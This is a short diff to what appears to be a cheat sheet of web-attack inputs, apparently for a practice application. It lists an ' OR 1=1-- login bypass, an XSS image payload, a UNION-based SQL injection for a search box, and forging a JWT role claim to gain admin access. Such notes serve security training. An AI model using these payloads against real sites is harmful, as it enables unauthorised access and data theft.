@@ -20,3 +20,5 @@ Login -> Email: ' OR 1=1--
 XSS
 In the Search bar, type:
      <img src=x onerror=alert('XSS')>
+SQL Injection	' UNION SELECT NULL-- in search box
+Admin access	Modify JWT token to "role": "admin" and re-sign
